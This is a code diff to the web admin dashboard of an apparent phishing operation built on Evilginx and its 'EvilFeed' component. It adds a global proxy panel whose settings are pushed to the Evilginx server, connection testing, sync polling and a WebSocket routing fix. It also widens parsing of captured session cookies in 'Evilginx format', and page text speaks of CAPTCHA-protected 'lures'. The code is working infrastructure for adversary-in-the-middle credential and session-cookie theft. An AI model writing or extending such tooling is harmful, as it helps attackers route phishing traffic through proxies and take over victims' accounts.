@@ -911,6 +911,7 @@
 
                 <!-- Turnstile Config -->
                 <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <!-- ... Turnstile content ... -->
                     <div class="flex items-center justify-between mb-4">
                         <h3 class="text-lg font-medium text-white">Cloudflare Turnstile Configuration</h3>
                         <!-- Sync Status Indicator -->
@@ -962,6 +963,94 @@
                             </div>
                         </div>
                         <p class="text-xs text-gray-500">Get your Turnstile keys from <a href="https://dash.cloudflare.com/?to=/:account/turnstile" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline">Cloudflare Dashboard</a>. When enabled, all lures will show a CAPTCHA challenge. Use "Push to Server" to sync your config.</p>
+                    </div>
+                </div>
+
+                <!-- Global Proxy Configuration -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-2">
+                             <h3 class="text-lg font-medium text-white">Global Proxy Configuration (Fallback)</h3>
+                             <span class="text-xs px-2 py-0.5 rounded bg-gray-700 text-gray-300">Default Gateway</span>
+                        </div>
+                        <!-- Sync Status Indicator -->
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Server Sync:</span>
+                            <span x-show="proxySyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="proxySyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="proxySyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="proxySyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="proxySyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Server Offline
+                            </span>
+                            <button type="button" @click="syncProxyFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Server">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">Proxy Type</label>
+                                <select x-model="settings.proxy_type" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                                    <option value="http">HTTP</option>
+                                    <option value="https">HTTPS</option>
+                                    <option value="socks5">SOCKS5</option>
+                                    <option value="socks5h">SOCKS5h (DNS over Proxy)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">Host / IP</label>
+                                <input type="text" x-model="settings.proxy_address" placeholder="1.2.3.4" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">Port</label>
+                                <input type="number" x-model="settings.proxy_port" placeholder="8080" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">Username (Optional)</label>
+                                <input type="text" x-model="settings.proxy_username" placeholder="user" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">Password (Optional)</label>
+                                <input type="password" x-model="settings.proxy_password" placeholder="pass" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center justify-between pt-2">
+                            <div class="flex items-center gap-4">
+                                <div class="flex items-center gap-2">
+                                    <span class="text-sm text-gray-400">Status:</span>
+                                    <span x-show="settings.proxy_enabled" class="text-green-400 text-sm font-medium">● Enabled</span>
+                                    <span x-show="!settings.proxy_enabled" class="text-red-400 text-sm font-medium">○ Disabled</span>
+                                </div>
+                                <label class="flex items-center gap-2 cursor-pointer">
+                                    <input type="checkbox" x-model="settings.proxy_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-blue-500 focus:ring-blue-500">
+                                    <span class="text-sm text-gray-400">Enable Global Proxy</span>
+                                </label>
+                            </div>
+                            <div class="flex gap-2">
+                                <button type="button" @click="testGlobalProxy()" :disabled="testingProxy" class="bg-gray-600 hover:bg-gray-500 text-white px-3 py-2 rounded text-sm flex items-center gap-2">
+                                    <span x-show="testingProxy" class="animate-spin h-3 w-3 border-2 border-white rounded-full border-t-transparent"></span>
+                                    Test Connection
+                                </button>
+                                <button type="button" @click="syncProxyToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Server">
+                                    Push to Server
+                                </button>
+                                <button type="button" @click="saveSettings" title="Save Proxy settings" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm">Save Configuration</button>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-500">
+                            This proxy is used when <strong>Proxy Pool is DISABLED</strong>. 
+                            If Proxy Pool is enabled, this setting is ignored (Tr.Dial = nil).
+                        </p>
                     </div>
                 </div>
 
@@ -1640,6 +1729,14 @@
             }
           }, 30000);
 
+          // Start Proxy sync polling every 30 seconds
+          this.syncProxyFromEvilginx();
+          setInterval(() => {
+            if (document.visibilityState === 'visible') {
+              this.syncProxyFromEvilginx();
+            }
+          }, 30000);
+
           // Start Telegram sync polling every 30 seconds
           this.syncTelegramFromEvilginx();
           setInterval(() => {
@@ -1706,17 +1803,23 @@
           const isProxied = pathParts.length > 0 && (pathParts[0] === 'admin' || pathParts[0] === 'feed');
           
           let wsUrl;
+          const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+
           if (isProxied) {
-            // When accessed via /admin/, we need to connect to EvilFeed directly
-            // Since goproxy can't handle WebSocket proxying, we connect to port 1337
-            // on the same hostname (the server, not localhost from browser perspective)
-            const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const hostname = location.hostname; // Server hostname
-            wsUrl = `${protocol}//${hostname}:1337/ws`;
-            console.log("[WS] Proxied access detected, connecting to EvilFeed on port 1337");
+            // CORRECT FIX: Use relative path WS connection to work through reverse proxies
+            // If we are at /admin/, websocket endpoint is at /admin/ws
+            // This avoids direct port 1337 connection which requires open firewall
+            
+            // Clean path: remove trailing slash
+            let cleanPath = location.pathname;
+            if (cleanPath.endsWith('/')) {
+                cleanPath = cleanPath.slice(0, -1);
+            }
+            
+            wsUrl = `${protocol}//${location.host}${cleanPath}/ws`;
+            console.log("[WS] Proxied access detected, connecting to relative path:", wsUrl);
           } else {
-            // Direct access - use same host
-            const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            // Direct access
             wsUrl = `${protocol}//${location.host}/ws`;
           }
           
@@ -2100,6 +2203,106 @@
                     this.turnstileSyncError = e.message || 'Sync failed';
                 }
                 console.warn('Turnstile sync error:', e);
+            }
+        },
+        async syncProxyFromEvilginx() {
+            this.proxySyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+
+                const res = await fetch('/api/proxy/sync', {
+                    method: 'GET',
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+
+                if (!res.ok) {
+                   const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) {
+                        this.proxySyncStatus = 'offline';
+                        return;
+                    }
+                    throw new Error(text || 'Sync failed');
+                }
+
+                const data = await res.json();
+                this.settings.proxy_type = data.type || 'socks5';
+                this.settings.proxy_address = data.address || '';
+                this.settings.proxy_port = data.port || 0;
+                this.settings.proxy_username = data.username || '';
+                // data.enabled might be missing depending on how InternalAPI response looks
+                if (data.enabled !== undefined) this.settings.proxy_enabled = data.enabled;
+
+                this.proxySyncStatus = 'synced';
+                this.proxySyncError = '';
+            } catch (e) {
+                 if (e.name === 'AbortError') {
+                    this.proxySyncStatus = 'offline';
+                    this.proxySyncError = 'Connection timeout - Evilginx may be offline';
+                } else {
+                    this.proxySyncStatus = 'error';
+                    this.proxySyncError = e.message || 'Sync failed';
+                }
+                console.warn('Proxy sync error:', e);
+            }
+        },
+        async syncProxyToEvilginx() {
+             this.proxySyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch('/api/proxy/push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: this.settings.proxy_type,
+                        address: this.settings.proxy_address,
+                        port: parseInt(this.settings.proxy_port || 0),
+                        username: this.settings.proxy_username,
+                        password: this.settings.proxy_password,
+                        enabled: !!this.settings.proxy_enabled
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                
+                if (!res.ok) throw new Error(await res.text());
+                
+                this.proxySyncStatus = 'synced';
+                this.proxySyncError = '';
+                showToast('Global proxy settings pushed to Evilginx', 'success');
+            } catch (e) {
+                this.proxySyncStatus = 'error';
+                this.proxySyncError = e.message;
+                showToast('Failed to push settings: ' + e.message, 'error');
+            }
+        },
+        async testGlobalProxy() {
+            this.testingProxy = true;
+            try {
+                const res = await fetch('/api/proxy/test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: this.settings.proxy_type,
+                        host: this.settings.proxy_address,
+                        port: parseInt(this.settings.proxy_port || 0),
+                        username: this.settings.proxy_username,
+                        password: this.settings.proxy_password
+                    })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Connection successful: ' + data.origin_ip, 'success');
+                } else {
+                    showToast('Connection failed: ' + (data.error || 'Unknown error'), 'error');
+                }
+            } catch (e) {
+                showToast('Test failed: ' + e.message, 'error');
+            } finally {
+                this.testingProxy = false;
             }
         },
         async syncTurnstileToEvilginx() {
@@ -2599,7 +2802,9 @@
                         const innerFirstKey = Object.keys(firstValue)[0];
                         const innerFirstValue = firstValue[innerFirstKey];
 
-                        if (innerFirstValue && (innerFirstValue.Name !== undefined || innerFirstValue.Value !== undefined)) {
+                        if (innerFirstValue &&
+                            (innerFirstValue.Name !== undefined || innerFirstValue.Value !== undefined ||
+                                innerFirstValue.name !== undefined || innerFirstValue.value !== undefined)) {
                             // Evilginx format: {domain: {cookieName: CookieToken}}
                             Object.entries(parsed).forEach(([domain, cookies]) => {
                                 if (cookies && typeof cookies === 'object') {
